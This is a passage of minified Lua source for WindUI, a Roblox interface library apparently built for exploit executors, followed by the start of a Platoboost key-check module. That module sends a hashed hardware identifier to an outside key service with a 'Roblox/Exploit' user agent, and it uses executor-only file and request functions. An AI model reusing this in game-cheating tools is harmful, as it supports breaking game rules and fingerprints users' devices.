TextColor3=Color3.new(1,1,1),
TextSize=14,
},
TextBox={
BackgroundColor3=Color3.new(1,1,1),
BorderColor3=Color3.new(0,0,0),
ClearTextOnFocus=false,
Text="",
TextColor3=Color3.new(0,0,0),
TextSize=14,
},
ImageLabel={
BackgroundTransparency=1,
BackgroundColor3=Color3.new(1,1,1),
BorderSizePixel=0,
},
ImageButton={
BackgroundColor3=Color3.new(1,1,1),
BorderSizePixel=0,
AutoButtonColor=false,
},
UIListLayout={
SortOrder="LayoutOrder",
},
ScrollingFrame={
ScrollBarImageTransparency=1,
BorderSizePixel=0,
},
VideoFrame={
BorderSizePixel=0,
},
},
Colors={
Red="#e53935",
Orange="#f57c00",
Green="#43a047",
Blue="#039be5",
White="#ffffff",
Grey="#484848",
},
ThemeFallbacks=nil,





















ThemeChangeCallbacks={},
}

function r.Init(u)
p=u

r.ThemeFallbacks=a.load'c'(r)

r.UIScale=u.UIScale

i:Init(r)
end

function r.AddSignal(u,v)
local x=u:Connect(v)
table.insert(r.Signals,x)
return x
end

function r.DisconnectAll()
for u,v in next,r.Signals do
local x=table.remove(r.Signals,u)
x:Disconnect()
end
end

function r.SafeCallback(u,...)
if not u then
return
end

local v,x=pcall(u,...)
if not v then
if p and p.Window and p.Window.Debug then local
z, A=x:find":%d+: "

warn("[ WindUI: DEBUG Mode ] "..x)

return p:Notify{
Title="DEBUG Mode: Error",
Content=not A and x or x:sub(A+1),
Duration=8,
}
end
end
end

function r.Gradient(u,v)
if p and p.Gradient then
return p:Gradient(u,v)
end

local x={}
local z={}

for A,B in next,u do
local C=tonumber(A)
if C then
C=math.clamp(C/100,0,1)
table.insert(x,ColorSequenceKeypoint.new(C,B.Color))
table.insert(z,NumberSequenceKeypoint.new(C,B.Transparency or 0))
end
end

table.sort(x,function(A,B)
return A.Time<B.Time
end)
table.sort(z,function(A,B)
return A.Time<B.Time
end)

if#x<2 then
error"ColorSequence requires at least 2 keypoints"
end

local A={
Color=ColorSequence.new(x),
Transparency=NumberSequence.new(z),
}

if v then
for B,C in pairs(v)do
A[B]=C
end
end

return A
end

function r.SetTheme(u)
local v=r.Theme
r.Theme=u
r.UpdateTheme(nil,false)

for x,z in next,r.ThemeChangeCallbacks do
r.SafeCallback(z,u,v)
end
end

function r.AddFontObject(u)
table.insert(r.FontObjects,u)
r.UpdateFont(r.Font)
end

function r.UpdateFont(u)
r.Font=u
for v,x in next,r.FontObjects do
x.FontFace=Font.new(u,x.FontFace.Weight,x.FontFace.Style)
end
end

function r.GetThemeProperty(u,v)
local function getValue(x,z)
local A=z[x]

if A==nil then
return nil
end

if typeof(A)=="string"and string.sub(A,1,1)=="#"then
return Color3.fromHex(A)
end

if typeof(A)=="Color3"then
return A
end

if typeof(A)=="number"then
return A
end

if typeof(A)=="table"and A.Color and A.Transparency then
return A
end

if typeof(A)=="function"then
return A(z)
end

return A
end

local x=getValue(u,v)
if x~=nil then
if typeof(x)=="string"and string.sub(x,1,1)~="#"then
local z=r.GetThemeProperty(x,v)
if z~=nil then
return z
end
else
return x
end
end

local z=r.ThemeFallbacks[u]
if z~=nil then
if typeof(z)=="string"and string.sub(z,1,1)~="#"then
return r.GetThemeProperty(z,v)
else
return getValue(u,{[u]=z})
end
end

x=getValue(u,r.Themes.Dark)
if x~=nil then
if typeof(x)=="string"and string.sub(x,1,1)~="#"then
local A=r.GetThemeProperty(x,r.Themes.Dark)
if A~=nil then
return A
end
else
return x
end
end

if z~=nil then
if typeof(z)=="string"and string.sub(z,1,1)~="#"then
return r.GetThemeProperty(z,r.Themes.Dark)
else
return getValue(u,{[u]=z})
end
end

return nil
end

function r.AddThemeObject(u,v,x)
if r.Objects[u]then
for z,A in pairs(v)do
r.Objects[u].Properties[z]=A
end
else
r.Objects[u]={Object=u,Properties=v}
end

if not x then
r.UpdateTheme(u,false)
end
return u
end

function r.AddLangObject(u)
local v=r.LocalizationObjects[u]
if not v then
return
end

local x=v.Object

r.SetLangForObject(u)

return x
end

function r.UpdateTheme(u,v,x,z,A,B)
local function ApplyTheme(C)
for F,G in pairs(C.Properties or{})do
local H=r.GetThemeProperty(G,r.Theme)
if H~=nil then
if typeof(H)=="Color3"then
local J=C.Object:FindFirstChild"LibraryGradient"
if J then
J:Destroy()
end

if x then
r.Tween(
C.Object,
z or 0.2,
{[F]=H},
A or Enum.EasingStyle.Quint,
B or Enum.EasingDirection.Out
):Play()
elseif v then
r.Tween(C.Object,0.08,{[F]=H}):Play()
else
C.Object[F]=H
end
elseif typeof(H)=="table"and H.Color and H.Transparency then
C.Object[F]=Color3.new(1,1,1)

local J=C.Object:FindFirstChild"LibraryGradient"
if not J then
J=Instance.new"UIGradient"
J.Name="LibraryGradient"
J.Parent=C.Object
end

J.Color=H.Color
J.Transparency=H.Transparency

for L,M in pairs(H)do
if L~="Color"and L~="Transparency"and J[L]~=nil then
J[L]=M
end
end
elseif typeof(H)=="number"then
if x then
r.Tween(
C.Object,
z or 0.2,
{[F]=H},
A or Enum.EasingStyle.Quint,
B or Enum.EasingDirection.Out
):Play()
elseif v then
r.Tween(C.Object,0.08,{[F]=H}):Play()
else
C.Object[F]=H
end
end
else
local J=C.Object:FindFirstChild"LibraryGradient"
if J then
J:Destroy()
end
end
end
end

if u then
local C=r.Objects[u]
if C then
ApplyTheme(C)
end
else
for C,F in pairs(r.Objects)do
ApplyTheme(F)
end
end
end

function r.SetThemeTag(u,v,x,z,A)
r.AddThemeObject(u,v)
r.UpdateTheme(u,false,true,x,z,A)
end

function r.SetLangForObject(u)
if r.Localization and r.Localization.Enabled then
local v=r.LocalizationObjects[u]
if not v then
return
end

local x=v.Object
local z=v.TranslationId

local A=r.Localization.Translations[r.Language]
if A and A[z]then
x.Text=A[z]
else
local B=r.Localization
and r.Localization.Translations
and r.Localization.Translations.en
or nil
if B and B[z]then
x.Text=B[z]
else
x.Text="["..z.."]"
end
end
end
end

function r.ChangeTranslationKey(u,v,x)
if r.Localization and r.Localization.Enabled then
local z=string.match(x,"^"..r.Localization.Prefix.."(.+)")
if z then
for A,B in ipairs(r.LocalizationObjects)do
if B.Object==v then
B.TranslationId=z
r.SetLangForObject(A)
return
end
end

table.insert(r.LocalizationObjects,{
TranslationId=z,
Object=v,
})
r.SetLangForObject(#r.LocalizationObjects)
end
end
end

function r.UpdateLang(u)
if u then
r.Language=u
end

for v=1,#r.LocalizationObjects do
local x=r.LocalizationObjects[v]
if x.Object and x.Object.Parent~=nil then
r.SetLangForObject(v)
else
r.LocalizationObjects[v]=nil
end
end
end

function r.SetLanguage(u)
r.Language=u
r.UpdateLang()
end

function r.Icon(u,v)
return m.Icon2(u,nil,v~=false)
end

function r.AddIcons(u,v)
return m.AddIcons(u,v)
end

function r.New(u,v,x)
local z=Instance.new(u)

for A,B in next,r.DefaultProperties[u]or{}do
z[A]=B
end

for A,B in next,v or{}do
if A~="ThemeTag"then
z[A]=B
end
if r.Localization and r.Localization.Enabled and A=="Text"then
local C=string.match(B,"^"..r.Localization.Prefix.."(.+)")
if C then
local F=#r.LocalizationObjects+1
r.LocalizationObjects[F]={TranslationId=C,Object=z}

r.SetLangForObject(F)
end
end
end

for A,B in next,x or{}do
B.Parent=z
end

if v and v.ThemeTag then
r.AddThemeObject(z,v.ThemeTag)
end
if v and v.FontFace then
r.AddFontObject(z)
end
return z
end

function r.Tween(u,v,x,...)
return f:Create(u,TweenInfo.new(v,...),x)
end








































































function r.NewRoundFrame(u,v,x,z,A,B)
return i:New(u,v,x,z,A,nil)
end

local u=r.New local v=
r.Tween

function r.SetDraggable(x)
r.CanDraggable=x
end

function r.Drag(x,z,A)
local B=p.GenerateGUID()

local C
local F=false
local G,H
local J

local L={
CanDraggable=true,
}

if not z or typeof(z)~="table"then
z={x}
end

local function update(M)
if not F or not L.CanDraggable then
return
end

local N=M.Position-G
r.Tween(x,0.02,{
Position=UDim2.new(
H.X.Scale,
H.X.Offset+N.X,
H.Y.Scale,
H.Y.Offset+N.Y
),
}):Play()
end

for M,N in pairs(z)do
N.InputBegan:Connect(function(O)
if not L.CanDraggable or F then
return
end

if
O.UserInputType==Enum.UserInputType.MouseButton1
or O.UserInputType==Enum.UserInputType.Touch
then
if p and p.CurrentInput and p.CurrentInput~=B then
return
end

p.CurrentInput=B

F=true
J=O
C=N
G=O.Position
H=x.Position

if A and typeof(A)=="function"then
A(true,C)
end
end
end)
end

e.InputChanged:Connect(function(M)
if not F then
return
end
if p.CurrentInput and p.CurrentInput~=B then
return
end

if J.UserInputType==Enum.UserInputType.MouseButton1 then
if M.UserInputType==Enum.UserInputType.MouseMovement then
update(M)
end
elseif J.UserInputType==Enum.UserInputType.Touch then
if M==J then
update(M)
end
end
end)

e.InputEnded:Connect(function(M)
if not F or p.CurrentInput~=B then
return
end

if
M==J
or(
J.UserInputType==Enum.UserInputType.MouseButton1
and M.UserInputType==Enum.UserInputType.MouseButton1
)
then
p.CurrentInput=nil
F=false
J=nil
C=nil

if A and typeof(A)=="function"then
A(false,nil)
end
end
end)

function L.Set(M,N)
L.CanDraggable=N
end

return L
end

m.Init(u,"Icon")

function r.SanitizeFilename(x)
local z=x:match"([^/]+)$"or x

z=z:gsub("%.[^%.]+$","")

z=z:gsub("[^%w%-_]","_")

if#z>50 then
z=z:sub(1,50)
end

return z
end

function r.Image(x,z,A,B,C,F,G,H)
B=B or"Temp"
z=r.SanitizeFilename(z)

local J=u("Frame",{
Size=UDim2.new(0,0,0,0),
BackgroundTransparency=1,
},{
u("ImageLabel",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
ScaleType="Crop",
ThemeTag=(r.Icon(x)or G)and{
ImageColor3=F and(H or"Icon")or nil,
}or nil,
},{
u("UICorner",{
CornerRadius=UDim.new(0,A),
}),
}),
})
if r.Icon(x)then
J.ImageLabel:Destroy()

local L=m.Image{
Icon=x,
Size=UDim2.new(1,0,1,0),
Colors={
(F and(H or"Icon")or false),
"Button",
},
}.IconFrame
L.Parent=J
elseif string.find(x,"http")and not string.find(x,"roblox.com")then
local L="WindUI/"..B.."/assets/."..C.."-"..z..".png"
local M,N=pcall(function()
task.spawn(function()
local M=r.Request
and r.Request{
Url=x,
Method="GET",
}.Body
or{}

if not d:IsStudio()and writefile then
writefile(L,M)
end


local N,O=pcall(getcustomasset,L)
if N then
J.ImageLabel.Image=O
else
warn(
string.format(
"[ WindUI.Creator ] Failed to load custom asset '%s': %s",
L,
tostring(O)
)
)
J:Destroy()

return
end
end)
end)
if not M then
warn(
"[ WindUI.Creator ]  '"..identifyexecutor()
or"Studio".."' doesnt support the URL Images. Error: "..N
)

J:Destroy()
end
elseif x==""then
J.Visible=false
else
J.ImageLabel.Image=x
end

return J
end

function r.Color3ToHSB(x)
local z,A,B=x.R,x.G,x.B
local C=math.max(z,A,B)
local F=math.min(z,A,B)
local G=C-F

local H=0
if G~=0 then
if C==z then
H=(A-B)/G%6
elseif C==A then
H=(B-z)/G+2
else
H=(z-A)/G+4
end
H=H*60
else
H=0
end

local J=(C==0)and 0 or(G/C)
local L=C

return{
h=math.floor(H+0.5),
s=J,
b=L,
}
end

function r.GetPerceivedBrightness(x)
local z=x.R
local A=x.G
local B=x.B
return 0.299*z+0.587*A+0.114*B
end

function r.GetTextColorForHSB(x,z)
local A=r.Color3ToHSB(x)local
B, C, F=A.h, A.s, A.b
if r.GetPerceivedBrightness(x)>(z or 0.5)then
return Color3.fromHSV(B/360,0,0.05)
else
return Color3.fromHSV(B/360,0,0.98)
end
end

function r.GetAverageColor(x)
local z,A,B=0,0,0
local C=x.Color.Keypoints
for F,G in ipairs(C)do

z=z+G.Value.R
A=A+G.Value.G
B=B+G.Value.B
end
local F=#C
return Color3.new(z/F,A/F,B/F)
end

function r.GenerateUniqueID(x)
return h:GenerateGUID(false)
end

function r.OnThemeChange(x,z)
if typeof(z)~="function"then
return
end

local A=h:GenerateGUID(false)
r.ThemeChangeCallbacks[A]=z

return{
Disconnect=function()
r.ThemeChangeCallbacks[A]=nil
end,
}
end

function r.AddColor(x,z,A,B)
B=math.clamp(B or 1,0,1)
if typeof(A)=="string"then
A=Color3.fromHex(A)
end

return function(C)
local F
if typeof(z)=="string"and string.sub(z,1,1)~="#"then
F=r.GetThemeProperty(z,C)
elseif typeof(z)=="string"then
F=Color3.fromHex(z)
else
F=z
end

if not F or typeof(F)~="Color3"then
return nil
end

return Color3.new(
math.clamp(F.R+A.R*B,0,1),
math.clamp(F.G+A.G*B,0,1),
math.clamp(F.B+A.B*B,0,1)
)
end
end

function r.GetElementPosition(x,z,A,B)
if type(A)~="number"or A~=math.floor(A)then
return nil,1
end






local C=#z


if C==0 or A<1 or A>C then
return nil,2
end

local function isDelimiter(F)
if F==nil then
return true
end
local G=F.__type
return G=="Divider"or G=="Space"or G=="Section"
end

if isDelimiter(z[A])then
return nil,3
end

local function calculate(F,G)
if G==1 then
return"Squircle"
end
if F==1 then
return B and"SquircleH-TL-TR"or"Squircle-TL-TR"
end
if F==G then
return B and"SquircleH-BL-BR"or"Squircle-BL-BR"
end
return"Square"
end

local F=1
local G=0

for H=1,C do
local J=z[H]
if isDelimiter(J)then
if A>=F and A<=H-1 then
local L=A-F+1
return calculate(L,G)
end
F=H+1
G=0
else
G=G+1
end
end

if A>=F and A<=C then
local H=A-F+1
return calculate(H,G)
end

return nil,4
end

return r end function a.e()

local b={}







function b.New(d,e,f)
local g={
Enabled=e.Enabled or false,
Translations=e.Translations or{},
Prefix=e.Prefix or"loc:",
DefaultLanguage=e.DefaultLanguage or"en"
}

f.Localization=g

return g
end



return b end function a.f()
local b=a.load'd'
local d=b.New
local e=b.Tween

local f={
Size=UDim2.new(0,300,1,-156),
SizeLower=UDim2.new(0,300,1,-56),
UICorner=18,
UIPadding=14,

Holder=nil,
NotificationIndex=0,
Notifications={},
}

function f.Init(g)
local h={
Lower=false,
}

function h.SetLower(i)
h.Lower=i
h.Frame.Size=i and f.SizeLower or f.Size
end

h.Frame=d("Frame",{
Position=UDim2.new(1,-29,0,56),
AnchorPoint=Vector2.new(1,0),
Size=f.Size,
Parent=g,
BackgroundTransparency=1,




},{
d("UIListLayout",{
HorizontalAlignment="Center",
SortOrder="LayoutOrder",
VerticalAlignment="Bottom",
Padding=UDim.new(0,8),
}),
d("UIPadding",{
PaddingBottom=UDim.new(0,29),
}),
})
return h
end

function f.New(g)
local h={
Title=g.Title or"Notification",
Content=g.Content or nil,
Icon=g.Icon or nil,
IconThemed=g.IconThemed,
Background=g.Background,
BackgroundImageTransparency=g.BackgroundImageTransparency,
Duration=g.Duration or 5,
Buttons=g.Buttons or{},
CanClose=g.CanClose~=false,
UIElements={},
Closed=false,
}



f.NotificationIndex=f.NotificationIndex+1
f.Notifications[f.NotificationIndex]=h









local i

if h.Icon then





















i=b.Image(
h.Icon,
h.Title..":"..h.Icon,
0,
g.Window,
"Notification",
h.IconThemed
)
i.Size=UDim2.new(0,26,0,26)
i.Position=UDim2.new(0,f.UIPadding,0,f.UIPadding)

end

local l
if h.CanClose then
l=d("ImageButton",{
Image=b.Icon"x"[1],
ImageRectSize=b.Icon"x"[2].ImageRectSize,
ImageRectOffset=b.Icon"x"[2].ImageRectPosition,
BackgroundTransparency=1,
Size=UDim2.new(0,16,0,16),
Position=UDim2.new(1,-f.UIPadding,0,f.UIPadding),
AnchorPoint=Vector2.new(1,0),
ThemeTag={
ImageColor3="Text",
},
ImageTransparency=0.4,
},{
d("TextButton",{
Size=UDim2.new(1,8,1,8),
BackgroundTransparency=1,
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
Text="",
}),
})
end

local m=b.NewRoundFrame(f.UICorner,"Squircle",{
Size=UDim2.new(0,0,1,0),
ThemeTag={
ImageTransparency="NotificationDurationTransparency",
ImageColor3="NotificationDuration",
},

})

local p=d("Frame",{
Size=UDim2.new(1,h.Icon and-28-f.UIPadding or 0,1,0),
Position=UDim2.new(1,0,0,0),
AnchorPoint=Vector2.new(1,0),
BackgroundTransparency=1,
AutomaticSize="Y",
},{
d("UIPadding",{
PaddingTop=UDim.new(0,f.UIPadding),
PaddingLeft=UDim.new(0,f.UIPadding),
PaddingRight=UDim.new(0,f.UIPadding),
PaddingBottom=UDim.new(0,f.UIPadding),
}),
d("TextLabel",{
AutomaticSize="Y",
Size=UDim2.new(1,-30-f.UIPadding,0,0),
TextWrapped=true,
TextXAlignment="Left",
RichText=true,
BackgroundTransparency=1,
TextSize=18,
ThemeTag={
TextColor3="NotificationTitle",
TextTransparency="NotificationTitleTransparency",
},
Text=h.Title,
FontFace=Font.new(b.Font,Enum.FontWeight.SemiBold),
}),
d("UIListLayout",{
Padding=UDim.new(0,f.UIPadding/3),
}),
})

if h.Content then
d("TextLabel",{
AutomaticSize="Y",
Size=UDim2.new(1,0,0,0),
TextWrapped=true,
TextXAlignment="Left",
RichText=true,
BackgroundTransparency=1,

TextSize=15,
ThemeTag={
TextColor3="NotificationContent",
TextTransparency="NotificationContentTransparency",
},
Text=h.Content,
FontFace=Font.new(b.Font,Enum.FontWeight.Medium),
Parent=p,
})
end

local r=b.NewRoundFrame(f.UICorner,"Squircle",{
Size=UDim2.new(1,0,0,0),
Position=UDim2.new(2,0,1,0),
AnchorPoint=Vector2.new(0,1),
AutomaticSize="Y",
ImageTransparency=0.05,
ThemeTag={
ImageColor3="Notification",
},

},{
b.NewRoundFrame(f.UICorner,"Squircle",{
Size=UDim2.new(1,0,1,0),
ThemeTag={
ImageColor3="Notification2",
ImageTransparency="Notification2Transparency",
},
}),
d("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
Name="DurationFrame",
},{






d("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
ClipsDescendants=true,
},{
m,
}),




}),
d("ImageLabel",{
Name="Background",
Image=h.Background,
BackgroundTransparency=1,
Size=UDim2.new(1,0,1,0),
ScaleType="Crop",
ImageTransparency=h.BackgroundImageTransparency,

},{
d("UICorner",{
CornerRadius=UDim.new(0,f.UICorner),
}),
}),

p,
i,
l,
})

local u=d("Frame",{
BackgroundTransparency=1,
Size=UDim2.new(1,0,0,0),
Parent=g.Holder,
},{
r,
})

function h.Close(v)
if not h.Closed then
h.Closed=true
e(
u,
0.45,
{Size=UDim2.new(1,0,0,-8)},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
e(r,0.55,{Position=UDim2.new(2,0,1,0)},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
task.wait(0.45)
u:Destroy()
end
end

task.spawn(function()
task.wait()
e(
u,
0.45,
{Size=UDim2.new(1,0,0,r.AbsoluteSize.Y)},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
e(r,0.45,{Position=UDim2.new(0,0,1,0)},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
if h.Duration then
m.Size=UDim2.new(0,r.DurationFrame.AbsoluteSize.X,1,0)
e(
r.DurationFrame.Frame,
h.Duration,
{Size=UDim2.new(0,0,1,0)},
Enum.EasingStyle.Linear,
Enum.EasingDirection.InOut
):Play()
task.wait(h.Duration)
h:Close()
end
end)

if l then
b.AddSignal(l.TextButton.MouseButton1Click,function()
h:Close()
end)
end


return h
end

return f end function a.g()












local b=4294967296;local d=b-1;local function c(e,f)local g,h=0,1;while e~=0 or f~=0 do local i,l=e%2,f%2;local m=(i+l)%2;g=g+m*h;e=math.floor(e/2)f=math.floor(f/2)h=h*2 end;return g%b end;local function k(e,f,g,...)local h;if f then e=e%b;f=f%b;h=c(e,f)if g then h=k(h,g,...)end;return h elseif e then return e%b else return 0 end end;local function n(e,f,g,...)local h;if f then e=e%b;f=f%b;h=(e+f-c(e,f))/2;if g then h=n(h,g,...)end;return h elseif e then return e%b else return d end end;local function o(e)return d-e end;local function q(e,f)if f<0 then return lshift(e,-f)end;return math.floor(e%4294967296/2^f)end;local function s(e,f)if f>31 or f<-31 then return 0 end;return q(e%b,f)end;local function lshift(e,f)if f<0 then return s(e,-f)end;return e*2^f%4294967296 end;local function t(e,f)e=e%b;f=f%32;local g=n(e,2^f-1)return s(e,f)+lshift(g,32-f)end;local e={0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2}local function w(f)return string.gsub(f,".",function(g)return string.format("%02x",string.byte(g))end)end;local function y(f,g)local h=""for i=1,g do local l=f%256;h=string.char(l)..h;f=(f-l)/256 end;return h end;local function D(f,g)local h=0;for i=g,g+3 do h=h*256+string.byte(f,i)end;return h end;local function E(f,g)local h=64-(g+9)%64;g=y(8*g,8)f=f.."\128"..string.rep("\0",h)..g;assert(#f%64==0)return f end;local function I(f)f[1]=0x6a09e667;f[2]=0xbb67ae85;f[3]=0x3c6ef372;f[4]=0xa54ff53a;f[5]=0x510e527f;f[6]=0x9b05688c;f[7]=0x1f83d9ab;f[8]=0x5be0cd19;return f end;local function K(f,g,h)local i={}for l=1,16 do i[l]=D(f,g+(l-1)*4)end;for l=17,64 do local m=i[l-15]local p=k(t(m,7),t(m,18),s(m,3))m=i[l-2]i[l]=(i[l-16]+p+i[l-7]+k(t(m,17),t(m,19),s(m,10)))%b end;local l,m,p,r,u,v,x,z=h[1],h[2],h[3],h[4],h[5],h[6],h[7],h[8]for A=1,64 do local B=k(t(l,2),t(l,13),t(l,22))local C=k(n(l,m),n(l,p),n(m,p))local F=(B+C)%b;local G=k(t(u,6),t(u,11),t(u,25))local H=k(n(u,v),n(o(u),x))local J=(z+G+H+e[A]+i[A])%b;z=x;x=v;v=u;u=(r+J)%b;r=p;p=m;m=l;l=(J+F)%b end;h[1]=(h[1]+l)%b;h[2]=(h[2]+m)%b;h[3]=(h[3]+p)%b;h[4]=(h[4]+r)%b;h[5]=(h[5]+u)%b;h[6]=(h[6]+v)%b;h[7]=(h[7]+x)%b;h[8]=(h[8]+z)%b end;local function Z(f)f=E(f,#f)local g=I{}for h=1,#f,64 do K(f,h,g)end;return w(y(g[1],4)..y(g[2],4)..y(g[3],4)..y(g[4],4)..y(g[5],4)..y(g[6],4)..y(g[7],4)..y(g[8],4))end;local f;local g={["\\"]="\\",["\""]="\"",["\b"]="b",["\f"]="f",["\n"]="n",["\r"]="r",["\t"]="t"}local h={["/"]="/"}for i,l in pairs(g)do h[l]=i end;local i=function(i)return"\\"..(g[i]or string.format("u%04x",i:byte()))end;local l=function(l)return"null"end;local m=function(m,p)local r={}p=p or{}if p[m]then error"circular reference"end;p[m]=true;if rawget(m,1)~=nil or next(m)==nil then local u=0;for v in pairs(m)do if type(v)~="number"then error"invalid table: mixed or invalid key types"end;u=u+1 end;if u~=#m then error"invalid table: sparse array"end;for v,x in ipairs(m)do table.insert(r,f(x,p))end;p[m]=nil;return"["..table.concat(r,",").."]"else for u,v in pairs(m)do if type(u)~="string"then error"invalid table: mixed or invalid key types"end;table.insert(r,f(u,p)..":"..f(v,p))end;p[m]=nil;return"{"..table.concat(r,",").."}"end end;local p=function(p)return'"'..p:gsub('[%z\1-\31\\"]',i)..'"'end;local r=function(r)if r~=r or r<=-math.huge or r>=math.huge then error("unexpected number value '"..tostring(r).."'")end;return string.format("%.14g",r)end;local u={["nil"]=l,table=m,string=p,number=r,boolean=tostring}f=function(v,x)local z=type(v)local A=u[z]if A then return A(v,x)end;error("unexpected type '"..z.."'")end;local v=function(v)return f(v)end;local x;local z=function(...)local z={}for A=1,select("#",...)do z[select(A,...)]=true end;return z end;local A=z(" ","\t","\r","\n")local B=z(" ","\t","\r","\n","]","}",",")local C=z("\\","/",'"',"b","f","n","r","t","u")local F=z("true","false","null")local G={["true"]=true,["false"]=false,null=nil}local H=function(H,J,L,M)for N=J,#H do if L[H:sub(N,N)]~=M then return N end end;return#H+1 end;local J=function(J,L,M)local N=1;local O=1;for P=1,L-1 do O=O+1;if J:sub(P,P)=="\n"then N=N+1;O=1 end end;error(string.format("%s at line %d col %d",M,N,O))end;local L=function(L)local M=math.floor;if L<=0x7f then return string.char(L)elseif L<=0x7ff then return string.char(M(L/64)+192,L%64+128)elseif L<=0xffff then return string.char(M(L/4096)+224,M(L%4096/64)+128,L%64+128)elseif L<=0x10ffff then return string.char(M(L/262144)+240,M(L%262144/4096)+128,M(L%4096/64)+128,L%64+128)end;error(string.format("invalid unicode codepoint '%x'",L))end;local M=function(M)local N=tonumber(M:sub(1,4),16)local O=tonumber(M:sub(7,10),16)if O then return L((N-0xd800)*0x400+O-0xdc00+0x10000)else return L(N)end end;local N=function(N,O)local P=""local Q=O+1;local R=Q;while Q<=#N do local S=N:byte(Q)if S<32 then J(N,Q,"control character in string")elseif S==92 then P=P..N:sub(R,Q-1)Q=Q+1;local T=N:sub(Q,Q)if T=="u"then local U=N:match("^[dD][89aAbB]%x%x\\u%x%x%x%x",Q+1)or N:match("^%x%x%x%x",Q+1)or J(N,Q-1,"invalid unicode escape in string")P=P..M(U)Q=Q+#U else if not C[T]then J(N,Q-1,"invalid escape char '"..T.."' in string")end;P=P..h[T]end;R=Q+1 elseif S==34 then P=P..N:sub(R,Q-1)return P,Q+1 end;Q=Q+1 end;J(N,O,"expected closing quote for string")end;local O=function(O,P)local Q=H(O,P,B)local R=O:sub(P,Q-1)local S=tonumber(R)if not S then J(O,P,"invalid number '"..R.."'")end;return S,Q end;local P=function(P,Q)local R=H(P,Q,B)local S=P:sub(Q,R-1)if not F[S]then J(P,Q,"invalid literal '"..S.."'")end;return G[S],R end;local Q=function(Q,R)local S={}local T=1;R=R+1;while 1 do local U;R=H(Q,R,A,true)if Q:sub(R,R)=="]"then R=R+1;break end;U,R=x(Q,R)S[T]=U;T=T+1;R=H(Q,R,A,true)local V=Q:sub(R,R)R=R+1;if V=="]"then break end;if V~=","then J(Q,R,"expected ']' or ','")end end;return S,R end;local R=function(R,S)local T={}S=S+1;while 1 do local U,V;S=H(R,S,A,true)if R:sub(S,S)=="}"then S=S+1;break end;if R:sub(S,S)~='"'then J(R,S,"expected string for key")end;U,S=x(R,S)S=H(R,S,A,true)if R:sub(S,S)~=":"then J(R,S,"expected ':' after key")end;S=H(R,S+1,A,true)V,S=x(R,S)T[U]=V;S=H(R,S,A,true)local W=R:sub(S,S)S=S+1;if W=="}"then break end;if W~=","then J(R,S,"expected '}' or ','")end end;return T,S end;local S={['"']=N,["0"]=O,["1"]=O,["2"]=O,["3"]=O,["4"]=O,["5"]=O,["6"]=O,["7"]=O,["8"]=O,["9"]=O,["-"]=O,t=P,f=P,n=P,["["]=Q,["{"]=R}x=function(T,U)local V=T:sub(U,U)local W=S[V]if W then return W(T,U)end;J(T,U,"unexpected character '"..V.."'")end;local T=function(T)if type(T)~="string"then error("expected argument of type string, got "..type(T))end;local U,V=x(T,H(T,1,A,true))V=H(T,V,A,true)if V<=#T then J(T,V,"trailing garbage")end;return U end;
local U,V,W=v,T,Z;





local X={}

local Y=(cloneref or clonereference or function(Y)return Y end)


function X.New(_,aa)

local ab=_;
local ac=aa;
local ad=true;


local ae=function(ae)end;


repeat task.wait(1)until game:IsLoaded();


local af=false;
local ag,ah,ai,aj,ak,al,am,an,ao=setclipboard or toclipboard,request or http_request or syn_request,string.char,tostring,string.sub,os.time,math.random,math.floor,gethwid or function()return Y(game:GetService"Players").LocalPlayer.UserId end
local ap,aq="",0;


local ar="https://api.platoboost.app";
local as=ah{
Url=ar.."/public/connectivity",
Method="GET"
};
if as.StatusCode~=200 and as.StatusCode~=429 then
ar="https://api.platoboost.net";
end


function cacheLink()
if aq+(600)<al()then
local at=ah{
Url=ar.."/public/start",
Method="POST",
Body=U{
service=ab,
identifier=W(ao())
},
Headers={
["Content-Type"]="application/json",
["User-Agent"]="Roblox/Exploit"
}
};

if at.StatusCode==200 then
local au=V(at.Body);

if au.success==true then
ap=au.data.url;
aq=al();
return true,ap
else
ae(au.message);
return false,au.message
end
elseif at.StatusCode==429 then
local au="you are being rate limited, please wait 20 seconds and try again.";
ae(au);
return false,au
end

local au="Failed to cache link.";
ae(au);
return false,au
else
return true,ap
end
end

cacheLink();


local at=function()
local at=""
for au=1,16 do
at=at..ai(an(am()*(26))+97)
end
return at
end


for au=1,5 do
local av=at();
task.wait(0.2)
if at()==av then
local aw="platoboost nonce error.";
ae(aw);
error(aw);
end
end


local au=function()
local au,av=cacheLink();

if au then
ag(av);
end
end


local av=function(av)
local aw=at();
local ax=ar.."/public/redeem/"..aj(ab);

local ay={
identifier=W(ao()),
key=av
}

if ad then
ay.nonce=aw;
end

local az=ah{
Url=ax,
Method="POST",
Body=U(ay),
Headers={
["Content-Type"]="application/json"
}
};

if az.StatusCode==200 then
local aA=V(az.Body);

if aA.success==true then
if aA.data.valid==true then
if ad then
if aA.data.hash==W("true".."-"..aw.."-"..ac)then
return true
else
ae"failed to verify integrity.";
return false
end
else
return true
end
else
ae"key is invalid.";
